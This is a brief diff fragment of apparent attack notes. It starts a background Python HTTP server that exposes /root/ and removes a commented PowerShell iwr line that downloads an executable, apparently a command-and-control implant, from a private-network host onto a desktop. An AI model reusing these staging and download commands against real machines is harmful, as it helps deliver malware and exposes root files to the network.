@@ -5,4 +5,3 @@ mtls
 
 exit
 python3 -m http.server 8000 -d /root/ &
-#iwr http://192.168.242.130:8000/ELEGANT_DIAPHRAGM.exe -o ~/desktop/elegant_diaphram.exe
